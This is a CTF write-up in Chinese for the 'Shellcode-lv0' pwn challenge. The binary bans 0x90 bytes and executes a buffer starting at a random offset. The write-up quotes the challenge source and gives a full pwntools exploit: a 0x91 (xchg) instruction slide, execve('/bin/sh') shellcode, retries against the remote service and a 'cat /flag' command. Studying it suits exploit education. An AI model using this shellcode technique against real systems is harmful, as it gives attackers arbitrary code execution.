# Shellcode-lv0

## 题目简述

程序把最多 `0x100` 字节读入固定 RWX 映射 `0x20240000`，拒绝任何字节 `0x90`，随后从 `buffer + rand() % 0x100` 的随机偏移开始执行。需要构造不含传统 NOP 的指令滑道，让大多数随机入口最终落到 `execve("/bin/sh")` shellcode。

## 解题过程

源码的两个约束是：

```c
read(0, shellcode_space, 0x100);
for (int i = 0; i < 0x100; i++) {
    if (shellcode_space[i] == 0x90)
        exit(-1);
}
shellcode_space += rand() % 0x100;
((void(*)())shellcode_space)();
```

使用单字节指令 `0x91`（`xchg eax, ecx`）代替 `0x90` 构造滑道。无论从滑道中的哪个字节开始，都能按单字节边界执行到真正 shellcode；进入前先 `xor eax, eax` 清除滑道对 `eax` 的影响，`ecx` 不参与后续 `execve` 参数。

随机入口仍可能直接落到多字节 shellcode 中部，因此该方案是高概率而非绝对成功。每次失败重新连接即可，成功概率至少约为“滑道长度除以 256”。

```python
from pwn import asm, context, remote, shellcraft

context(arch="amd64", os="linux")

code = asm("xor eax, eax") + asm(shellcraft.sh())
payload = code.rjust(0x100, b"\x91")
assert len(payload) == 0x100
assert b"\x90" not in payload

for attempt in range(1, 50):
    io = remote("HOST", PORT)
    io.sendafter(b"Show me what you want to run: ", payload)
    io.sendline(b"echo SHELL_OK; cat /flag")
    output = io.recvrepeat(1)

    if b"SHELL_OK" in output:
        print(f"success after {attempt} attempts")
        print(output.decode(errors="replace"))
        io.close()
        break

    io.close()
else:
    raise RuntimeError("随机入口连续失败，请重新运行")
```

仓库 Dockerfile 引用了 `build/flag`，但该比赛 flag 文件未被纳入仓库，因此 WP 不补写无法核验的字符串；成功回显中的 `/flag` 内容就是答案。

## 方法总结

本题考查“随机入口 shellcode”与非 `0x90` 指令滑道。关键是选择固定长度的一字节、可消除副作用的指令填满前缀，并严格发送完整 `0x100` 字节，避免随机入口落入尚未写入的零区域。
